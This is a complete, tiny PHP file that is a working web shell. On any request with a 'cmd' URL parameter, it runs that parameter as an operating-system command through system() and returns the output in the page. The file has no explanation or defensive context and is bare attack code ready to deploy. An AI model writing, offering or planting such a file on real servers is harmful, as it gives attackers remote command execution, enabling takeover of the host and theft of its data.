<?php
if(isset($_GET['cmd'])){echo "<h1>cmd</h1><pre>"; system($_GET['cmd']);exit;}
?>